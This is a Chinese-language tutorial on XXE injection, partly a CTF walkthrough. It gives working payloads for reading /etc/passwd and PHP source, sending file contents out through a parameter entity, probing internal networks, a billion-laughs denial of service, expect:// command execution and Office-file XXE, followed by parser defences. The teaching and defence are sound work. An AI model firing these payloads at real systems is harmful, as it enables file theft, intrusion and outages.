## 什么是XXE？

XXE全称XML External Entity
Injection，即外部实体注入。owasp网站对其的描述是：XXE是针对应用程序解析XML输入类型的攻击。当 **包含对外部实体的引用的 XML
输入被弱配置的 XML 解析器处理**
时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。

## XML基础知识

XML 指可扩展标记语言（EXtensible Markup Language），是一种很像html的语言。但它的标签需要我们自己定义。

基本格式：

    
    
    <?xml version="1.0" encoding="UTF-8"?> //开头需要声明
    <root> //必须包含一个根元素
        <child>//子元素
        	<subchild></subchild>
        </child>
    </root>//所有元素都需要有对应的关闭标签
    

语法规则：

1.标签大小写敏感

2.属性值必须加引号，单双都可，如果值用双引号可以用单引号包裹

3.所有元素都必须有一个关闭标签

4.标签必须正确嵌套

5.XML中空格会被保留，不像html中只保留一个

6.<、&必须用实体引用，>、‘、“建议使用实体引用（以防万一还是都用实体引用吧）

## DTD基础知识

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML
文档中，也可作为一个外部引用。

DTD中实体可分为内部实体和外部实体，又可分为参数实体。下面分别介绍这两种分类。（其实关于这种分类，我在网上看到好几种说法，也不知道谁是最准确的，但是不管怎么分，也就只有那么几种写法）

## 内部实体和外部实体

#### 内部实体声明：(在DTD内部声明)

    
    
    语法：<!ENTITY entity-name "entity-value"> 
    示例：
    <!DOCTYPE author[
    	<!ELEMRNT author (#PCDATA)
    	<!ENTITY name "Restart">
    ]>
    <author>&ampname</author>//引用实体
    

#### 外部实体声明：（在DTD外部声明实体）

    
    
    语法：<!ENTITY entity-name SYSTEM "URL/URI"> 
    示例:
    <!DOCTYPE author [
    	<!ENTITY name SYSTEM "author.dtd">
    ]>
    <author>&ampname</author>//引用实体
    

#### 参数实体

    
    
    语法：<!ENTITY % entity-name "entity-value">
    示例：
    <!DOCTYPE author[
    	<!ENTITY % name "Restart">
    ]>
    <author>%name;</author>
    

可以发现除了参数实体在定义和引用的时候需要用%，其他实体引用都是用&。

总结出来可以知道，在XML中引用实体，都需要（&或%）+（实体名）+（;），这三个条件（或者说元素）缺一不可。

## 一些利用手段

### 1.文件读取

以[NCTF2019]True XML cookbook这道题为例，这里就跳过其他步骤直接来到xxe环节

抓包后简单构造读取文件

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE xxe [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    

![image](https://image.3001.net/images/20211223/1640264319_61c4727f88f3d9e35bd05.png!small)

有的时候不能直接读出文件内容，需要编码一下，例如读取php文件。因为php文件内部已经含有<等字符，因此需要用filter来读

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE xxe [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">]>
    

还有一个需要注意的地方，就是嵌套的参数实体，内层的%需要改为字符实体，例如

    
    
    <!ENTITY % payload "<!ENTITY % send SYSTEM 'http://localhost:88/?content=%file;'>"> %payload;
    

### 2.内网探测

接上题，分别构造payload查看hosts文件和arp文件

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE xxe [
    <!ENTITY xxe SYSTEM "file:///etc/hosts">]>
    

![image](https://image.3001.net/images/20211223/1640264352_61c472a03e9b1ef68ba90.png!small)

这里是因为hosts文件里没有显示可供访问的内网ip，所以我们去查看arp文件

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE xxe [
    <!ENTITY xxe SYSTEM "file:///proc/net/arp">]>
    

![image](https://image.3001.net/images/20211223/1640264373_61c472b5e9335e96e3e23.png!small)  
查到了两个ip，接下来继续利用xxe访问内网，需要爆破一下c段，然后访问。

### 3.Dos攻击

本质是递归，通俗来说就是套娃

    
    
    <?xml version="1.0"?>
         <!DOCTYPE lolz [
         <!ENTITY lol "lol">
         <!ENTITY lol2 "&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol">
         <!ENTITY lol3 "&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2">
         <!ENTITY lol4 "&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3">
         <!ENTITY lol5 "&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4">
         <!ENTITY lol6 "&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5">
         <!ENTITY lol7 "&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6">
         <!ENTITY lol8 "&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7">
         <!ENTITY lol9 "&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8">
         ]>
         <lolz>&amplol9</lolz>
    

### 4.expect rce

在安装expect扩展的PHP环境里执行系统命令

    
    
    <?xml version="1.0" encoding="utf-8"?> 
    <!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "expect://id" >]>
    <root>
    <name>&ampxxe</name>
    </root>
    

## 无回显的xxe

这种xxe需要将数据外带，可以利用burp上的[collaborator工具](https://blog.csdn.net/fageweiketang/article/details/89073662)

![image](https://image.3001.net/images/20211223/1640264405_61c472d5854a0749cde8f.png!small)

原理就是将这个工具随机产生的url复制到xxe的payload中，当目标服务器进行了外部的请求和交互，该工具会记录下来，于是证明了漏洞存在。

当然，除了利用这个工具，其他平台也可以，类比其他攻击方式的数据外带

## Content-Type中的json和xml

>
> **当WEB服务使用XML或者JSON中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在JSON传输的终端可能会遭受XXE攻击**

简单来说就是将Content-Type: application/ **json** 改为Content-Type: application/
**xml** ，然后将post的内容格式也从json转换为xml，举个例子

    
    
    原始json数据：
    {"search":"name","value":"netspitest"} 
    
    修改为xml格式后：
    <?xml version="1.0" encoding="UTF-8" ?>
    <root>
    <search>name</search>
    <value>netspitest</value>
    </root>
    

加上root的原因是：json转换过来后没有XML格式文件所必须的元素，可能导致服务器无法正常响应  
  

## 关于office文件xxe攻击的实现

这个地方首先需要明白xml文件的文件格式，其本质也属于zip压缩文件，相信做过misc题目的同学应该都清楚，office的文件都可以将后缀名改成zip，以压缩文件的方式查看。

了解了这一点，那么来看看excel的构成。这里我新建了一个空白的excel文件，将后缀改为了zip后打开

![image](https://image.3001.net/images/20211223/1640264449_61c47301732c4f790aa99.png!small)

这里关注[Content_Types].xml文件，将payload插入这个文件，然后将压缩包还原为excel文件进行后续攻击

为了能够更加清楚地理解这种攻击方式，这里给出三个例子

1.[利用docx实现XXE](https://www.cnblogs.com/0nc3/p/13436410.html)

2.[利用Excel进行XXE攻击](https://my.oschina.net/u/4582816/blog/4392870)

3.[利用Blind XXE
Getshell(Java网站)](https://mp.weixin.qq.com/s/sroA2ohYew4BzKvR0qqpFw)

因此，当渗透测试时遇到上传office文件的地方，不妨尝试一下这种攻击方式

## 挖掘XXE的方法

1.检测XML是否会被解析

2.检测服务器是否支持外部实体

3.如果上面两步都支持，那么就看能否回显。有则直接攻击，无则参考无回显的xxe攻击

## 防御XXE的方法

  1. 使用开发语言提供的禁用外部实体的方法

    
    
    PHP：
    libxml_disable_entity_loader(true);
    
    JAVA:
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);
    
    Python：
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
    

  2. 过滤和验证用户提交的XML数据  
过滤关键词<!DOCTYPE、<!ENTITY SYSTEM、PUBLIC

  3. 不允许XML中含有任何自己声明的DTD

  4. 有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可

## 参考链接

  * [XML实体注入漏洞的利用与学习](https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html)

  * [一篇文章带你理解漏洞之 XXE 漏洞](https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/#%E5%AE%9E%E9%AA%8C%E5%85%AB%EF%BC%9A%E5%85%B6%E4%BB%96%EF%BC%9A)

  * [神奇的Content-Type——在JSON中玩转XXE攻击](http://bobao.360.cn/learning/detail/360.html)

  * [XXE漏洞分析](https://www.4o4notfound.org/index.php/archives/29/)

  * [歪？我想要一个XXE。](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41#wechat_redirect)

  * [xxe漏洞专题](https://blog.csdn.net/qq_33942040/article/details/111399819)

  * [XXE漏洞挖掘分享](https://cloud.tencent.com/developer/article/1079593)

